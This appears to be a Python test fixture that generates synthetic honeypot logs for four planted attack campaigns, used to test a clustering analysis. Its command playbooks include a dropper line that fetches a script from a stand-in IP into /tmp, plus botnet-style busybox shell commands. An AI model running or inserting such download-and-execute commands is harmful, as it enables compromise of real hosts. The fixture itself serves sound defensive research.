# honeypot/analysis/ml/tests/fixtures.py
#
# Synthetic snapshot with planted campaigns, so tests can check that the
# clustering recovers a known answer. Each campaign has its own credential
# dictionary, command playbook, client fingerprint, protocol and session
# rate -- the signals real campaigns differ by -- plus shared noise (the
# root:root-style pairs every campaign tries). Campaign IPs are spread
# over all ASNs, as botnets are, so a grouped-by-ASN split still sees every
# campaign in every split.
import datetime as dt
import gzip
import json
from pathlib import Path

import numpy as np
import polars as pl

from honeypot.analysis.overview.tests.fixtures import EVENT_SCHEMA

ML_EVENT_SCHEMA = EVENT_SCHEMA | {
    "username": pl.Utf8,
    "password": pl.Utf8,
    "command_input": pl.Utf8,
    "raw": pl.Utf8,
}
N_ASNS = 24
COUNTRIES = ("US", "CN", "BR", "IN")
SHARED_PAIRS = (("root", "root"), ("admin", "admin"), ("root", "123456"))
_START = dt.datetime(2026, 8, 1, tzinfo=dt.UTC)


def _dictionary(prefix: str, size: int) -> list[tuple[str, str]]:
    return [(f"{prefix}user{i % 7}", f"{prefix}pass{i}") for i in range(size)]


CAMPAIGNS = {
    "telnet_bot": {
        "protocol": "telnet",
        "pairs": _dictionary("tb", 12),
        "commands": ["enable", "system", "shell", "sh", "/bin/busybox QXZT"],
        "client": {"telnet": ["WILL:NAWS", "DO:ECHO"]},
        "sessions": 3,
        "download": False,
    },
    "ssh_dropper": {
        "protocol": "ssh",
        "pairs": _dictionary("sd", 10),
        "commands": ["uname -a", "cd /tmp", "wget http://203.0.113.9/x.sh"],
        "client": {"version": "SSH-2.0-Go", "hassh": "h-go"},
        "sessions": 2,
        "download": True,
    },
    "ssh_sprayer": {
        "protocol": "ssh",
        "pairs": _dictionary("sp", 60),
        "commands": [],
        "client": {"version": "SSH-2.0-OpenSSH_7.4", "hassh": "h-openssh"},
        "sessions": 12,
        "download": False,
    },
    "ssh_recon": {
        "protocol": "ssh",
        "pairs": _dictionary("rc", 6),
        "commands": ["uname -s -v -n -r -m"],
        "client": {"version": "SSH-2.0-libssh2_1.11.1", "hassh": "h-libssh"},
        "sessions": 1,
        "download": False,
    },
}


def _ip(value: int) -> str:
    return ".".join(str((value >> shift) & 255) for shift in (24, 16, 8, 0))


def asn_block(i: int) -> int:
    """First address of ASN i's /16."""
    return (10 << 24) + (i << 16)


def _event(
    session: str, eventid: str, src_ip: str, time: dt.datetime, protocol: str, **extra
) -> dict:
    raw = {"eventid": eventid, "session": session, "src_ip": src_ip} | {
        k: v for k, v in extra.items() if k in {"version", "hassh", "command"}
    }
    if "option_name" in extra:
        raw |= {"command": extra["command"], "option_name": extra["option_name"]}
    return {
        "event_timestamp": time,
        "eventid": eventid,
        "node_role": "agent_detector" if protocol == "telnet" else "control_proxy",
        "protocol": protocol,
        "session": session,
        "sensor": "sensor-a",
        "src_ip": src_ip,
        "dst_ip": "10.0.0.1",
        "dst_port": 2223 if protocol == "telnet" else 2222,
        "duration_ms": None,
        "username": extra.get("username"),
        "password": extra.get("password"),
        "command_input": extra.get("command_input"),
        "raw": json.dumps(raw),
    }


def _session_events(
    rng: np.random.Generator, spec: dict, session: str, src_ip: str, start: dt.datetime
) -> list[dict]:
    protocol = spec["protocol"]
    clock = iter(start + dt.timedelta(seconds=s) for s in range(10_000))
    rows = [_event(session, "cowrie.session.connect", src_ip, next(clock), protocol)]
    client = spec["client"]
    if protocol == "ssh":
        rows.append(
            _event(
                session,
                "cowrie.client.version",
                src_ip,
                next(clock),
                protocol,
                version=client["version"],
            )
        )
        rows.append(
            _event(
                session,
                "cowrie.client.kex",
                src_ip,
                next(clock),
                protocol,
                hassh=client["hassh"],
            )
        )
    else:
        for label in client["telnet"]:
            command, option = label.split(":")
            rows.append(
                _event(
                    session,
                    "cowrie.telnet.option",
                    src_ip,
                    next(clock),
                    protocol,
                    command=command,
                    option_name=option,
                )
            )
    pairs = spec["pairs"]
    n_tries = int(rng.integers(1, 4))
    for _ in range(n_tries):
        if rng.random() < 0.3:
            username, password = SHARED_PAIRS[rng.integers(len(SHARED_PAIRS))]
        else:
            username, password = pairs[rng.integers(len(pairs))]
        rows.append(
            _event(
                session,
                "cowrie.login.failed",
                src_ip,
                next(clock),
                protocol,
                username=username,
                password=password,
            )
        )
    if spec["commands"]:
        username, password = pairs[rng.integers(len(pairs))]
        rows.append(
            _event(
                session,
                "cowrie.login.success",
                src_ip,
                next(clock),
                protocol,
                username=username,
                password=password,
            )
        )
        for command in spec["commands"]:
            rows.append(
                _event(
                    session,
                    "cowrie.command.input",
                    src_ip,
                    next(clock),
                    protocol,
                    command_input=command,
                )
            )
        if spec["download"]:
            rows.append(
                _event(
                    session,
                    "cowrie.session.file_download",
                    src_ip,
                    next(clock),
                    protocol,
                )
            )
    rows.append(_event(session, "cowrie.session.closed", src_ip, next(clock), protocol))
    return rows


def campaign_events(
    seed: int = 0, ips_per_campaign: int = 60, scanners: int = 20
) -> tuple[pl.DataFrame, pl.DataFrame]:
    """(events, truth): snapshot-shaped events for CAMPAIGNS, and one row
    per campaign IP (src_ip, campaign, asn). Each IP sits in a random ASN
    /16; `scanners` extra IPs only connect (no login, so never profiled)."""
    rng = np.random.default_rng(seed)
    rows, truth, used = [], [], set()
    for campaign, spec in CAMPAIGNS.items():
        for n in range(ips_per_campaign):
            asn = int(rng.integers(N_ASNS))
            while (value := asn_block(asn) + int(rng.integers(1, 65_000))) in used:
                pass
            used.add(value)
            src_ip = _ip(value)
            truth.append({"src_ip": src_ip, "campaign": campaign, "asn": 64500 + asn})
            n_sessions = max(1, int(rng.poisson(spec["sessions"])))
            for s in range(n_sessions):
                start = _START + dt.timedelta(
                    minutes=int(rng.integers(0, 28 * 24 * 60))
                )
                rows += _session_events(rng, spec, f"{campaign}-{n}-{s}", src_ip, start)
    for n in range(scanners):
        src_ip = _ip(asn_block(int(rng.integers(N_ASNS))) + 65_100 + n)
        rows.append(
            _event(f"scan-{n}", "cowrie.session.connect", src_ip, _START, "ssh")
        )
    return pl.DataFrame(rows, schema=ML_EVENT_SCHEMA), pl.DataFrame(truth)


def write_campaign_dbip(enrichment_dir: Path, month: str = "2026-01") -> None:
    """DB-IP Lite country + ASN CSVs covering the N_ASNS /16s, in the
    published filename format so fetch_dbip never downloads."""
    enrichment_dir.mkdir(parents=True, exist_ok=True)
    country_rows, asn_rows = [], []
    for i in range(N_ASNS):
        start, end = asn_block(i), asn_block(i) + 2**16 - 1
        country_rows.append(f"{_ip(start)},{_ip(end)},{COUNTRIES[i % len(COUNTRIES)]}")
        asn_rows.append(f'{_ip(start)},{_ip(end)},{64500 + i},"Net {i}"')
    for kind, rows in (("country", country_rows), ("asn", asn_rows)):
        path = enrichment_dir / f"dbip-{kind}-lite-{month}.csv.gz"
        path.write_bytes(gzip.compress(("\n".join(rows) + "\n").encode()))
